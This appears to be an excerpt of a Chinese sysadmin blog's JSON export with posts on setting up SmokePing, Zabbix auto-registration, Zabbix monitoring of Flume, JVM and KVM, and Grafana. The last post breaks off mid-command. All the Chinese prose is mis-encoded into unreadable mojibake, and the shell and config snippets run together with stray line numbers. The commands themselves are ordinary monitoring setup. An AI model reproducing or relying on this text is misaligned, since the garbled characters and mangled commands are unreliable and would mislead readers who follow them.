ç³»ç»Ÿé‡Œæ˜¯å¦å®‰è£…äº†ä¸­æ–‡å­—ä½“ï¼Œæˆ–è€…åœ¨å®‰è£…ä¸€ä¸ª 123456789[root@smokeping data]# ps -ef |grep smoke #æŸ¥æ‰¾smokepingè¿›ç¨‹root 8740 1 0 09:08 ? 00:00:00 /usr/local/smokeping/bin/smokeping [FPing]root 35552 35529 0 09:33 pts/2 00:00:00 grep smoke[root@smokeping data]# kill 8740 #æ€æ‰smokepingè¿›ç¨‹[root@smokeping data]# ps -ef |grep smokeroot 35554 35529 4 09:33 pts/2 00:00:00 grep smokesmokepingè¿›ç¨‹å·²ç»è¢«æ€æ‰[root@smokeping data]#screen #å¦‚æœé€šè¿‡SSHè¿œç¨‹ç™»å½•åˆ°ç›‘æ§ä¸»æœºï¼Œæœ€åæ‰§è¡Œscreenï¼Œåœ¨è™šæ‹Ÿçª—å£ä¸­å¯åŠ¨smokeping/usr/local/smokeping/bin/smokeping --logfile=/var/log/smokeping.log 2&gt;&amp;1 &amp; ä¸‰. æ·»åŠ éœ€è¦ç›‘æ§çš„ç½‘ç«™å’ŒèŠ‚ç‚¹(åœ¨/usr/local/smokeping/etc/configä¸­æ·»åŠ ) smokepingå°±è¿™ç‚¹ä¸å¥½ï¼Œæ·»åŠ èŠ‚ç‚¹ä¸èƒ½åœ¨å‰å°Webé¡µé¢æ·»åŠ ï¼Œä¸€å®šè¦åœ¨åå°çš„é…ç½®æ–‡ä»¶ä¸­æ·»åŠ ,å¸Œæœ›ä»¥åçš„ç‰ˆæœ¬ä¸­èƒ½æ”¹è¿›ä¸€ä¸‹ * ä¿®æ”¹/usr/local/smokeping/etc/config åï¼Œå¿…é¡»é‡å¯smokeping ç¨‹åºï¼Œé…ç½®æ‰ä¼šç”Ÿæ•ˆ * smokeping ä¼šæ ¹æ®é…ç½®æ–‡ä»¶config åœ¨/usr/local/smokeping/data ä¹‹ä¸‹æ·»åŠ moniteræ–‡ä»¶å¤¹ï¼Œå…¶ä¸‹åŒ…å«websiteå­æ–‡ä»¶å¤¹ * ç”¨vmware workstationçš„è™šæ‹Ÿæœºæµ‹è¯•æœ‰ä¸€ç‚¹å¥½å¤„ï¼Œworkstationä¸‹çš„è™šæ‹Ÿç½‘å¡å¯ä»¥è®¾ç½®å‡ºå…¥çš„ä¸¢åŒ…ç‡ï¼Œé€‚åˆsmokepingåšä¸¢åŒ…æµ‹è¯•, ç»è¿‡æµ‹è¯•smokepingæ£€æµ‹å‡ºçš„ä¸¢åŒ…ç‡ä¸vmware worksationè™šæ‹Ÿç½‘å¡è®¾ç½®çš„ä¸¢åŒ…ç‡åŸºæœ¬ç›¸åŒ,ä¹Ÿå°±æ˜¯è¯´smokeping èƒ½å¤Ÿååº”ç½‘ç»œçš„çœŸå®çŠ¶å†µ * æ·»åŠ ç›‘æ§èŠ‚ç‚¹ç¤ºä¾‹ï¼šæ³¨æ„+æ˜¯ç¬¬ä¸€å±‚ï¼Œ++æ˜¯ç¬¬äºŒå±‚ï¼Œ+++ æ˜¯ç¬¬ä¸‰å±‚ 123456789101112131415161718192021222324252627282930313233343536+ moniter menu = moniter++ websitemenu = websitetitle = moniter website#host = /moniter/website/baidu /moniter/website/sina /moniter/website/taobao /moniter/website/QQ+++ baidumenu = baidutitle = baidu.comalerts = somelosshost = www.baidu.com+++ sinamenu = sinatitle = sina.com.cnalerts = somelosshost = www.sina.com.cn+++ taobaomenu = taobaotitle = taobao.comalerts = somelosshost = www.taobao.com+++ QQmenu = QQtitle = QQalerts = somelosshost = www.qq.com.cn+++ sohumenu = sohutitle = sohualerts = somelosshost = www.sohu.com æ•ˆæœå›¾ï¼šå½“å‰èœå•ä¸‹ä¸»æœºå»¶æ—¶ï¼Œä¸¢åŒ…å›¾ æ•ˆæœå›¾ï¼šå½“å‰èœå•ä¸‹æŸä¸»æœºå»¶æ—¶ï¼Œä¸¢åŒ…è¯¦ç»†å›¾ 13.å›¾ä¾‹è¯´æ˜ ç»¿å—è¡¨ç¤ºä¸ä¸¢åŒ…ï¼Œå…¶ä»–é¢œè‰²çš„å—è¡¨ç¤ºä¸åŒç¨‹åºçš„ä¸¢åŒ…ã€‚å›¾å½¢è¶Šå¹³ç¨³ï¼Œè¡¨ç¤ºç½‘ç»œè¶Šç¨³å®šï¼Œå¦‚æœå›¾å½¢å³°å€¼å’Œä½è°·å¾ˆå¤šï¼Œåˆ™è¡¨ç¤ºç½‘ç»œæ—¶å»¶ä¸ç¨³å®šï¼Œå¿½é«˜å¿½ä½ã€‚ è¿™é‡Œapache å¦‚æœè¦ä½ åšä¸ªURLçš„æ–‡ä»¶ä¸‹è½½æµ‹è¯• 1dd if=/dev/null bs=1M count=1 of=/var/www/html/index.html","link":"/2014/04/19/æ€§èƒ½ç›‘æ§/Somekeping/ç”¨æœ€ç®€å•æ˜“æ‡‚çš„æ–¹å¼å®‰è£…smokeping/"},{"title":"ZABBIX 3.0 è‡ªåŠ¨å‘ç°  (ä¹)","text":"####è‡ªåŠ¨åŒ–åˆ†ç±» æ‰€æœ‰çš„è‡ªåŠ¨åŒ–éƒ½å¯ä»¥åˆ†ä¸º2ç§ 1.è‡ªåŠ¨æ³¨å†Œ zabbix-agnetè‡ªåŠ¨æ·»åŠ  2.ä¸»åŠ¨å‘ç° è‡ªåŠ¨å‘ç° Discover zabbix api Zabbixè‡ªåŠ¨å‘ç°(Discovery)åŠŸèƒ½ä½¿ç”¨éšç€ç›‘æ§ä¸»æœºä¸æ–­å¢å¤šï¼Œæœ‰çš„æ—¶å€™éœ€è¦æ·»åŠ ä¸€æ‰¹æœºå™¨ï¼Œç‰¹åˆ«æ˜¯åˆšç”¨zabbixçš„è¿ç»´äººå‘˜éœ€è¦å°†å…¬å¸çš„æ‰€æœ‰æœåŠ¡å™¨æ·»åŠ åˆ°zabbixï¼Œå¦‚æœä½¿ç”¨ä¼ ç»ŸåŠæ³•å»å•ä¸ªæ·»åŠ è®¾å¤‡ã€åˆ†ç»„ã€é¡¹ç›®ã€å›¾åƒâ€¦..ç»“æœåº”è¯¥æ˜¯è®©äººåçš„ç»“æœã€‚é‰´äºè¿™ä¸ªé—®é¢˜æˆ‘ä»¬å¯ä»¥å¥½å¥½åˆ©ç”¨ä¸‹Zabbixçš„ä¸€ä¸ªå‘ç°(Discovery)æ¨¡å—ï¼Œè¿›è€Œæ¥å®ç°è‡ªåŠ¨åˆšå‘ç°ä¸»æœºã€è‡ªåŠ¨å°†ä¸»æœºæ·»åŠ åˆ°ä¸»æœºç»„ã€è‡ªåŠ¨åŠ è½½æ¨¡æ¿ã€è‡ªåŠ¨åˆ›å»ºé¡¹ç›®ï¼ˆitemï¼‰ã€è‡ªåŠ¨åˆ›å»ºå›¾åƒï¼Œä¸‹é¢æˆ‘ä»¬æ¥çœ‹çœ‹è¿™ä¸ªæ¨¡å—å¦‚ä½•ä½¿ç”¨ã€‚ #####Hadoopé›†ç¾¤è‡ªåŠ¨å‘ç°ï¼š ä¸€ã€è‡ªåŠ¨æ³¨å†Œè®¾ç½® zabbix-agenté…ç½®123456789101112[root@wlj-datanode10 zabbix]# cat zabbix_agentd.confPidFile=/var/run/zabbix/zabbix_agentd.pidLogFile=/var/log/zabbix/zabbix_agentd.logLogFileSize=0Server=10.155.74.153# ä¸»åŠ¨æ¨¡å¼ä¸‹çš„zabbixæœåŠ¡ç«¯ServerActive=10.155.74.153# ä¸»æœºå(è¿™ä¸ªä¼šè‡ªåŠ¨åŠ å…¥åˆ°zabbix-serveræ–­çš„ä¸»æœºæ˜¾ç¤ºä¸­)Hostname=wlj-datanode10.jollychic.com-169.44.23.133Timeout=10UnsafeUserParameters=1HostMetadata=bi # ä½œä¸ºserverç«¯çš„åˆ¤æ–­æ¡ä»¶å…¥å£ æˆ‘ä»¬å…ˆä¸é‡å¯ï¼Œå› ä¸ºé‡å¯å°±ç”Ÿæ•ˆäº†ã€‚æˆ‘ä»¬éœ€è¦è®¾ç½®ä¸€ä¸ªè§„åˆ™ï¼Œå¦‚æœå·²ç»è®¾ç½®å¥½è§„åˆ™å¯ä»¥é‡å¯ã€‚ âœ¨âœ¨æç¤ºï¼š zabbix-agentèµ·æ¥çš„æ—¶å€™å›å»æ‰¾Serverï¼Œè¿™æ—¶å€™å°±ä¼šäº§ç”Ÿä¸€ä¸ªäº‹ä»¶ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥åŸºäºè¿™ä¸ªäº‹ä»¶æ¥å®Œæˆä¸€ä¸ªåŠ¨ä½œã€‚ Configuration - Actions - Create action 1234567name:bi-dataDefault subject : Auto registration: &#123;HOST.HOST&#125;Default message :Host name: &#123;HOST.HOST&#125;Host IP: &#123;HOST.IP&#125;Agent port: &#123;HOST.PORT&#125; é€‰æ‹©æ–°çš„è§¦å‘æ¡ä»¶é€‰æ‹©ä¸‹æ‹‰æ¡†ä¸­çš„æœåŠ¡ç±»å‹ é€‰æ‹©å‘é€å‘Šè­¦å¯¹åº”çš„ç”¨æˆ·ç»„-å‘é€æ–¹å¼å¾®ä¿¡å‘Šè­¦ é€‰æ‹©è‡ªåŠ¨å‘ç°æœåŠ¡å™¨æ·»åŠ ç›¸åº”çš„åˆ†ç»„ é€‰æ‹©è‡ªåŠ¨å‘ç°æœåŠ¡å™¨æ·»åŠ ç›¸åº”ç›‘æ§æ¨¡æ¿ ä¿®æ”¹å®Œä¹‹åæˆ‘ä»¬åœ¨é‡å¯ä¸€ä¸‹ 1[root@wlj-datanode3 ~]# systemctl restart zabbix-agent.service è‡ªåŠ¨å‘ç°å¯ä»¥å»æ‰«æIPåœ°å€èŒƒå›´ï¼ˆéœ€è¦æ‰‹åŠ¨è®¾ç½®ï¼‰è¿›è¡Œå‘ç°çš„åŠ¨ä½œ ç›‘æ§å‘Šè­¦æ¥æ”¶ï¼š äº¤æµå­¦ä¹ ï¼šğŸ§ Linux shell_é«˜çº§è¿ç»´æ´¾: 459096184 åœˆå­ (ç³»ç»Ÿè¿ç»´-åº”ç”¨è¿ç»´-è‡ªåŠ¨åŒ–è¿ç»´-è™šæ‹ŸåŒ–æŠ€æœ¯ç ”ç©¶æ¬¢è¿åŠ å…¥)ğŸ§ BigData-Exchange School : 521621407 åœˆå­ï¼ˆå¤§æ•°æ®è¿ç»´)ï¼ˆHadoopå¼€å‘äººå‘˜)ï¼ˆå¤§æ•°æ®ç ”ç©¶çˆ±å¥½è€…) æ¬¢è¿åŠ å…¥ ç›¸åº”Bidataæœ‰å†…éƒ¨å¾®ä¿¡äº¤æµç¾¤äº’ç›¸å­¦ä¹ ï¼ŒåŠ å…¥QQç¾¤æœ‰é“¾æ¥ã€‚","link":"/2017/05/21/æ€§èƒ½ç›‘æ§/Zabbix/ZABBIX 3.0 è‡ªåŠ¨å‘ç°  (ä¹)/"},{"title":"ZABBIX monitoring Flume","text":"ZABBIX monitoring FlumeFlumeæœ¬èº«æä¾›äº†http, gangliaçš„ç›‘æ§æœåŠ¡ï¼Œè€Œæˆ‘ä»¬ç›®å‰ä¸»è¦ä½¿ç”¨zabbixåšç›‘æ§ã€‚å› æ­¤ï¼Œæˆ‘ä»¬ä¸ºFlumeæ·»åŠ äº†zabbixç›‘æ§æ¨¡å—ï¼Œå’Œsaçš„ç›‘æ§æœåŠ¡æ— ç¼èåˆã€‚å¦ä¸€æ–¹é¢ï¼Œå‡€åŒ–Flumeçš„metricsã€‚åªå°†æˆ‘ä»¬éœ€è¦çš„metricså‘é€ç»™zabbixï¼Œé¿å… zabbix serveré€ æˆå‹åŠ›ã€‚ç›®å‰æˆ‘ä»¬æœ€ä¸ºå…³å¿ƒçš„æ˜¯Flumeèƒ½å¦åŠæ—¶æŠŠåº”ç”¨ç«¯å‘é€è¿‡æ¥çš„æ—¥å¿—å†™åˆ°Hdfsä¸Šï¼Œ å¯¹åº”å…³æ³¨çš„metricsä¸ºï¼š Source : æ¥æ”¶çš„eventæ•°å’Œå¤„ç†çš„eventæ•°Channel : Channelä¸­æ‹¥å µçš„eventæ•°Sink : å·²ç»å¤„ç†çš„eventæ•° zabbixå®‰è£…&amp;JVMæ€§èƒ½ç›‘æ§1234567891011121314151617181920212223242526zabbixå®‰è£…http://my.oschina.net/yunnet/blog/173161JDK1.8[jollybi@countly1 conf]$ java -versionjava version \"1.8.0_65\"Java(TM) SE Runtime Environment (build 1.8.0_65-b17)Java HotSpot(TM) 64-Bit Server VM (build 25.65-b01, mixed mode)#JVMæ€§èƒ½ç›‘æ§Young GC counts/usr/local/jdk/bin/jstat -gcutil 87007 | tail -1 | awk '&#123;print $6&#125;'95.16Full GC counts/usr/local/jdk/bin/jstat -gcutil 87007 | tail -1 | awk '&#123;print $8&#125;'436.252JVM total memory usage/usr/local/jdk/bin/jmap -histo $(pgrep java)|grep Total | sed -n '$p' | awk '&#123;print $3&#125;'JVM total instances usage /usr/local/jdk/bin/jmap -histo $(pgrep java)|grep Total | sed -n '$p' | awk '&#123;print $2&#125;' flumeåº”ç”¨å‚æ•°ç›‘æ§12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849å¯åŠ¨æ—¶åŠ ä¸ŠJSON repotingå‚æ•°,è¿™æ ·å°±å¯ä»¥é€šè¿‡http://localhost:34545/metricsè®¿é—®bin/flume-ng agent --conf conf --conf-file conf/flume-conf-test.properties --name agent -Dflume.root.logger=INFO,console -Dflume.monitoring.type=http -Dflume.monitoring.port=34545 &amp;[root@localhost apache-flume-1.8.0-bin]# curl http://localhost:34545/metrics 2&gt;/dev/null|sed -e 's/\\([,]\\)\\s*/\\1\\n/g' -e 's/[&#123;&#125;]/\\n/g' -e 's/[\",]//g'SOURCE.source1:EventReceivedCount:4871AppendBatchAcceptedCount:52Type:SOURCEEventAcceptedCount:4871AppendReceivedCount:0StartTime:1511251310062OpenConnectionCount:0AppendAcceptedCount:0AppendBatchReceivedCount:52StopTime:0SINK.sink1:ConnectionCreatedCount:0BatchCompleteCount:0BatchEmptyCount:43EventDrainAttemptCount:0StartTime:1511251311047BatchUnderflowCount:1ConnectionFailedCount:0ConnectionClosedCount:0Type:SINKRollbackCount:0EventDrainSuccessCount:4871KafkaEventSendTimer:24748StopTime:0CHANNEL.channel1:ChannelCapacity:1000ChannelFillPercentage:0.0Type:CHANNELChannelSize:0EventTakeSuccessCount:4871EventTakeAttemptCount:4915StartTime:1511251309391EventPutAttemptCount:4871EventPutSuccessCount:4871StopTime:0/opt/jdk1.8.0_101/bin/jstat é…ç½®ç›‘æ§flumeçš„è„šæœ¬æ–‡ä»¶1234567891011121314vim /etc/zabbix/monitor_flume.shevent=EventDrainSuccessCount#curl http://localhost:34545/metrics 2&gt;/dev/null|sed -e 's/\\([,]\\)\\s*/\\1\\n/g' -e 's/[&#123;&#125;]/\\n/g' -e 's/[\",]//g' |grep $1|awk -F: '&#123;print $2&#125;'function EventDrainSuccessCount &#123;curl http://localhost:34545/metrics 2&gt;/dev/null|sed -e 's/\\([,]\\)\\s*/\\1\\n/g' -e 's/[&#123;&#125;]/\\n/g' -e 's/[\",]//g' |grep $event|awk -F: '&#123;print $2&#125;'&#125;function StartTime &#123;curl http://localhost:34545/metrics 2&gt;/dev/null|sed -e 's/\\([,]\\)\\s*/\\1\\n/g' -e 's/[&#123;&#125;]/\\n/g' -e 's/[\",]//g' |grep StartTim |awk -F: '&#123;print $2&#125;' |sed -n \"2p\"&#125;function Total &#123;curl http://localhost:34545/metrics 2&gt;/dev/null|sed -e 's/\\([,]\\)\\s*/\\1\\n/g' -e 's/[&#123;&#125;]/\\n/g' -e 's/[\",]//g' |grep Total|awk -F: '&#123;print $2&#125;'&#125;#Run the requested function$1 åœ¨zabbix agenté…ç½®æ–‡ä»¶è¿›è¡Œéƒ¨ç½²123456vim zabbix_flume_jdk.confUserParameter=ygc.counts,sudo /opt/jdk1.8.0_101/bin/jstat -gcutil $(pgrep java|head -1)|tail -1|awk '&#123;print $6&#125;'UserParameter=fgc.counts,sudo /opt/jdk1.8.0_101/bin/jstat -gcutil $(pgrep java|head -1)|tail -1|awk '&#123;print $8&#125;'UserParameter=jvm.memory.usage,sudo /opt/jdk1.8.0_101/bin/jmap -histo $(pgrep java|sed -n '$p')|grep Total | sed -n '$p' |awk '&#123;print $3&#125;'UserParameter=jvm.instances.usage,sudo /opt/jdk1.8.0_101/bin/jmap -histo $(pgrep java|sed -n '$p')|grep Total | sed -n '$p' |awk '&#123;print $2&#125;'UserParameter=flume.monitor[*],sudo /bin/bash /etc/zabbix/monitor_flume.sh $1","link":"/2017/09/21/æ€§èƒ½ç›‘æ§/Zabbix/ZABBIX monitoring Flume/"},{"title":"KVM monitoring through Zabbix","text":"KVM monitoring through ZabbixMonitor your KVM resources through Zabbix Zabbix ç›‘æ§ KVM å®‰è£…ä¾èµ–python2, libvirt-python (tested with 0.9.12.3, 0.10.2 and 1.1.3.x) pip install libvirt-python KVM Server è®¾å®šç¨‹åº123456cd /usr/local/bin/wget https://github.com/bushvin/zabbix-kvm-res/raw/master/bin/zabbix-kvm-res.pychmod a+x zabbix-kvm-res.pycd /etc/zabbix/zabbix_agentd.dwget https://github.com/bushvin/zabbix-kvm-res/raw/master/zabbix_agentd.conf/UserParametersservice zabbix-agent restart Zabbix Server è®¾å®šç¨‹åºè‡³https://github.com/bushvin/zabbix-kvm-resä¸‹è½½zabbix_kvm.xmlå°†zabbix_kvm.xml æ±‡å…¥è‡³Zabbix Server â†’ Configuration â†’ Templates â†’ Import äº¤æµå­¦ä¹ ï¼šğŸ§ Linux shell_é«˜çº§è¿ç»´æ´¾: 459096184 åœˆå­ (ç³»ç»Ÿè¿ç»´-åº”ç”¨è¿ç»´-è‡ªåŠ¨åŒ–è¿ç»´-è™šæ‹ŸåŒ–æŠ€æœ¯ç ”ç©¶æ¬¢è¿åŠ å…¥)ğŸ§ BigData-Exchange School : 521621407 åœˆå­ï¼ˆå¤§æ•°æ®è¿ç»´)ï¼ˆHadoopå¼€å‘äººå‘˜)ï¼ˆå¤§æ•°æ®ç ”ç©¶çˆ±å¥½è€…) æ¬¢è¿åŠ å…¥ ç›¸åº”Bidataæœ‰å†…éƒ¨å¾®ä¿¡äº¤æµç¾¤äº’ç›¸å­¦ä¹ ï¼ŒåŠ å…¥QQç¾¤æœ‰é“¾æ¥ã€‚","link":"/2016/07/21/æ€§èƒ½ç›‘æ§/Zabbix/Zabbix ç›‘æ§ KVMé›†ç¾¤/"},{"title":"zabbix+Grafanaå®‰è£…ä½¿ç”¨ç›‘æ§ç»“åˆ","text":"å‰è¨€åšè¿ç»´çš„å¾ˆé‡è¦çš„åŸºç¡€å·¥ä½œå°±æ˜¯ç›‘æ§å»å‡†ç¡®å®šä½é—®é¢˜ï¼Œä¹‹å‰ç”¨çš„æ˜¯Nagiosåšè¿‡ç›‘æ§ï¼Œä¹Ÿç”¨è¿‡cactiï¼Œè¿™ä¸ªä¹‹å‰åœ¨IDCåšCDNç½‘ç»œæ–¹é¢ç”¨çš„æ¯”è¾ƒå¤šï¼Œç›‘æ§æµé‡å¥½å¸®æ‰‹ã€‚ ä¸ºä»€ä¹ˆé€‰æ‹©zabbixå…¶å®ç°åœ¨æ˜¯ç®—å¼€æºç›‘æ§æ¯”è¾ƒç«çš„ã€‚æ›´é‡è¦æ˜¯å‡ æ¬¾ç›‘æ§åšäº†å¯¹æ¯”ã€‚ cactiã€zabbixåŒnagiosä¸€æ ·ï¼Œéƒ½æ˜¯éå¸¸ä¼˜åŠ¿çš„å¼€æºç›‘æ§è½¯ä»¶ã€‚ Nagios: è½»é‡çº§/æ–¹ä¾¿/å¿«æ·æ˜¯nagiosæœ€å¤§çš„ä¼˜åŠ¿ï¼Œç‰¹åˆ«æ˜¯å®ƒçš„æ’ä»¶æœºåˆ¶ï¼Œä½ å¯ä»¥ç”¨è‡ªå·±ç†Ÿæ‚‰çš„è¯­è¨€å®ç°å‡ ä¹ä»»ä½•è‡ªå·±æƒ³è¦å®ç°çš„ç›‘æ§ã€‚ä½†nagiosçš„å›¾æ ‡å›¾å½¢æ˜¾ç¤ºçš„å¾ˆä¸‘ï¼Œè¿™æ–¹é¢çš„ç¡®ä¸æ•¢æ­ç»´ã€‚Cacti: cactiçš„ä¼˜åŠ¿è¡¨ç°åœ¨ç³»ç»Ÿæ–¹é¢çš„ç›‘æ§ï¼Œç‰¹åˆ«é’ˆå¯¹æµé‡çš„ç›‘æ§åŠŸèƒ½ï¼Œ ä»¥åŠcactiå›¾å½¢æ˜¾ç¤ºç¾è§‚ç­‰ï¼Œcactiåœ¨è¿™ä¸¤æ–¹é¢è¡¨ç°çš„éƒ½ä¸é”™ã€‚Zabbix: zabbixæ˜¯ä¸€ä¸ªåŸºäºWEBç•Œé¢çš„æä¾›åˆ†å¸ƒå¼ç³»ç»Ÿç›‘è§†ä»¥åŠç½‘ç»œç›‘è§†åŠŸèƒ½çš„ä¼ä¸šçº§çš„å¼€æºè§£å†³æ–¹æ¡ˆã€‚åŠŸèƒ½å…¨é¢ï¼Œå¾ˆå¤šå…¬å¸éƒ½æ˜¯åŸºäºzabbixè‡ªå»ºçš„ç›‘æ§å¹³å°ã€‚ä½†ç»´æŠ¤ç›¸å¯¹å›°éš¾ï¼Œç›¸æ¯”æ²¡æœ‰nagiosè½»é‡åŠçµæ´»ã€‚ ç°åœ¨sassç›‘æ§ï¼Œä¹Ÿæˆä¸ºä¼ä¸šç›‘æ§çš„é€‰æ‹©ä¹‹ä¸€äº†ï¼ŒåŠ ä¸Šzabbixã€Gangliaç­‰ï¼Œå†åŠ ä¸ŠAPMçš„å…´èµ·ï¼Œç›‘æ§ä½“ç³»ä¹Ÿè¶Šæ¥è¶Šå®Œå–„äº†ã€‚ä»åŸºç¡€ç½‘ç»œç›‘æ§ã€ç¡¬ä»¶ã€æœåŠ¡å™¨ã€åº”ç”¨ã€æ€§èƒ½ï¼Œç„¶åç«¯åˆ°ç«¯ç­‰æ–¹é¢ï¼Œéƒ½å¯ä»¥æ’å…¥ï¼Œä½†æ˜¯æ²¡æœ‰ä¸€ä¸ªæ¯”è¾ƒå®Œæ•´çš„ç›‘æ§ä½“ç³»æ˜¯å¯ä»¥å®Œå…¨èƒœä»»çš„ï¼Œæ‰€ä»¥è¿˜éœ€è¦æ ¹æ®è‡ªèº«çš„åº”ç”¨å’Œç›®æ ‡å»ç»¼åˆåšé€‰æ‹©ã€‚ å‰å‡ å¤©æ¥è§¦åˆ°äº†ELK(logstash, elasticsearch, kibana)è¿™å¥—æ—¥å¿—æ”¶é›†å±•ç¤ºå·¥å…·é›†,çš„ç¡®å¾ˆæ–¹ä¾¿ï¼Œè¿™æ ·å¯¹ä»¥åå¼€å‘æŒ‡å®šæƒé™æŸ¥çœ‹æ—¥å¿—ï¼Œå¯ä»¥å¾ˆå¥½ç®¡ç†ã€‚ è¿™é‡Œç®€å•è¯´äº†ä¸‹ä¸ºä»€ä¹ˆä½¿ç”¨zabbix, Gangliaçš„åŠŸèƒ½æ˜¯å“ªäº›ï¼Ÿä¸‹é¢æœ‰è®²åˆ°ã€‚ Grafanaæ˜¯ä»€ä¹ˆï¼Ÿä¸ªäººè®¤ä¸ºï¼š Grafanaæ˜¯ä¸€æ¬¾å¯¹åç«¯æ•°æ®è¿›è¡Œå®æ—¶å±•ç¤ºï¼Œè·Ÿelké‚£ç§å·®ä¸å¤šï¼Œéå¸¸æ¸…æ™°è€Œä¸”çµæ´»ä¸°å¯Œçš„å›¾å½¢åŒ–é€‰é¡¹ï¼Œå¯ä»¥æ··åˆå¤šç§é£æ ¼ï¼Œæ”¯æŒç™½å¤©å’Œå¤œé—´çš„æ¨¡å¼ï¼Œå¤šä¸ªæ•°æ®æºï¼Œè€Œè·Ÿzabbixæ¯”èµ·æ¥æ²¡æœ‰é‚£ä¹ˆä¸“ä¸šç›‘æ§ï¼Œæ²¡æœ‰é‚£ä¹ˆä¸°å¯Œçš„ç›‘æ§åŠŸèƒ½ï¼Œå°±æ˜¯ä¸€ä¸ªå›¾åƒå±•ç¤ºã€‚ åŠŸèƒ½äº®ç‚¹ ä¸°å¯Œçš„å›¾å½¢ä¸Grafana æ¨¡æ¿å˜é‡å¯ä»¥åˆ›å»ºå¯é‡ç”¨çš„ä»ªè¡¨æ¿ å®˜æ–¹æ˜¯æ€ä¹ˆè§£é‡ŠGrafanaçš„ï¼š grafanaæ˜¯ç”¨äºå¯è§†åŒ–å¤§å‹æµ‹é‡æ•°æ®çš„å¼€æºç¨‹åºï¼Œä»–æä¾›äº†å¼ºå¤§å’Œä¼˜é›…çš„æ–¹å¼å»åˆ›å»ºã€å…±äº«ã€æµè§ˆæ•°æ®ã€‚dashboardä¸­æ˜¾ç¤ºäº†ä½ ä¸åŒmetricæ•°æ®æºä¸­çš„æ•°æ®ã€‚grafanaæœ€å¸¸ç”¨äºå› ç‰¹ç½‘åŸºç¡€è®¾æ–½å’Œåº”ç”¨åˆ†æï¼Œä½†åœ¨å…¶ä»–é¢†åŸŸä¹Ÿæœ‰æœºä¼šç”¨åˆ°ï¼Œæ¯”å¦‚ï¼šå·¥ä¸šä¼ æ„Ÿå™¨ã€å®¶åº­è‡ªåŠ¨åŒ–ã€è¿‡ç¨‹æ§åˆ¶ç­‰ç­‰ã€‚grafanaæœ‰çƒ­æ’æ‹”æ§åˆ¶é¢æ¿å’Œå¯æ‰©å±•çš„æ•°æ®æºï¼Œç›®å‰å·²ç»æ”¯æŒGraphiteã€InfluxDBã€OpenTSDBã€Elasticsearchã€‚ GrafanaåŠŸèƒ½äº®ç‚¹1234567891011121314151617181920212223242526272829ä¸°å¯Œçš„å›¾å½¢å®Œå…¨äº¤äº’çš„ï¼Œå¯ç¼–è¾‘çš„å›¾è¡¨ã€‚å¤šä¸ªYè½´ï¼Œå¯¹æ•°åˆ»åº¦å’Œé€‰é¡¹ã€‚æ··åˆé€ å‹ç”»å‡ºä½ çš„å›¾å½¢ï¼Œä½ æƒ³æ€ä¹ˆã€‚æ··çº¿ï¼Œç‚¹å’Œé…’å§ã€‚æ··åˆå †å ç“¦ç‰¹/éš”ç¦»ç³»åˆ—ã€‚ä¸»é¢˜é™„å¸¦ä¸¤ä¸ªä¸»é¢˜ã€‚å¦‚æœä½ ä¸å–œæ¬¢é»˜è®¤çš„é»‘æš—çš„ä¸»é¢˜ï¼Œåˆ‡æ¢åˆ°å…‰çš„ä¸»é¢˜ã€‚æ¨¡æ¿å˜é‡åˆ›å»ºå˜é‡ä¼šè‡ªåŠ¨å¡«å…¥å€¼ä»æ‚¨çš„æ•°æ®åº“ã€‚ä¸€èˆ¬å¯é‡å¤ä½¿ç”¨æ‚¨å¯ä»¥åœ¨åº¦é‡æŸ¥è¯¢å’Œé¢æ¿æ ‡é¢˜ä¸­ä½¿ç”¨å˜é‡ã€‚é‡å¤é¢æ¿è‡ªåŠ¨é‡å¤æ¯ä¸ªé€‰å®šçš„å˜é‡å€¼çš„è¡Œæˆ–é¢æ¿ã€‚æ•°æ®æºæ”¯æŒGraphiteï¼ŒElasticsearchï¼ŒPrometheusï¼ŒInfluxDBï¼ŒOpenTSDBå’ŒKairosDBå¼€ç®±ã€‚æˆ–ä½¿ç”¨æ’ä»¶åŠŸèƒ½æ¥æ·»åŠ è‡ªå·±çš„ã€‚è®¤è¯ç®¡ç†ç”¨æˆ·ï¼Œè§’è‰²å’Œç»„ç»‡ã€‚é€šè¿‡LDAPï¼ŒåŸºæœ¬éªŒè¯ä¸è®¤è¯ä»£ç†æ³¨é‡Šæ³¨é‡Šä¸datasoucesåŒ…æ‹¬Elasticsearchï¼ŒçŸ³å¢¨å’ŒInfluxDBä¸°å¯Œçš„æ´»åŠ¨å›¾å¿«ç…§å…±äº«åˆ›å»ºå’Œå…±äº«åœ¨1ç‚¹å‡»ä¸€ä¸ªå®Œå…¨äº¤äº’å¼å›¾è¡¨å’Œåªæœ‰ä½ çš„å›¢é˜Ÿæˆ–å…¨ä¸–ç•Œåˆ†äº«ã€‚ Grafanaå®˜ç½‘Granfanaå®˜ç½‘ï¼šhttp://grafana.org Granfanaå®˜ç½‘å®‰è£…å‚è€ƒæ–‡æ¡£å®‰è£…æ–‡æ¡£ï¼šhttp://docs.grafana.org/installation/ grafanaå’ŒLDAPé›†æˆï¼šLDAPé›†æˆï¼šhttp://docs.grafana.org/installation/ldap/ grafanaæ¼”ç¤ºç«™ç‚¹grafanaæ¼”ç¤ºç«™ç‚¹: http://play.grafana.org/ 3.0ç‰ˆæœ¬å…³äºGrafana-zabbixæ’ä»¶å®˜æ–¹æ–‡æ¡£ï¼šGrafana-zabbixæ’ä»¶å®‰è£…å®˜æ–¹ä½¿ç”¨æ–‡æ¡£ å®˜ç½‘ä¸‹è½½åœ°å€Download Grafana:Download Grafana å®‰è£…Grafana æ¸©é¦¨æç¤ºï¼š 12grafanaçš„ç‰ˆæœ¬å’Œgrafana-zabbixçš„ç‰ˆæœ¬å¿…é¡»åŒ¹é…ï¼Œå¦åˆ™ä¼šå‡ºç°å¼‚å¸¸ã€‚æœ¬æ–‡ä»¥grafana2.5ç‰ˆæœ¬ä¸ºä¾‹è®²è§£ï¼Œå¦‚æœåé¢grafanaå’Œgrafana-zabbixæ›´æ–°ï¼Œéœ€è¦å°†2ä¸ªç‰ˆæœ¬åŒ¹é…å³å¯ã€‚ ç°åœ¨æœ€æ–°ç‰ˆæœ¬æ˜¯3.0ç‰ˆæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥è¯•è¯•å®‰è£…åœ¨åŸºäºRPMçš„Linuxç‰ˆæœ¬ï¼ˆCentOSï¼ŒFedoraçš„ï¼ŒOpenSuseå½“ä¸­ï¼Œçº¢å¸½ï¼‰ å®‰è£…æœ€æ–°ç¨³å®šç‰ˆï¼š 1sudo yum install 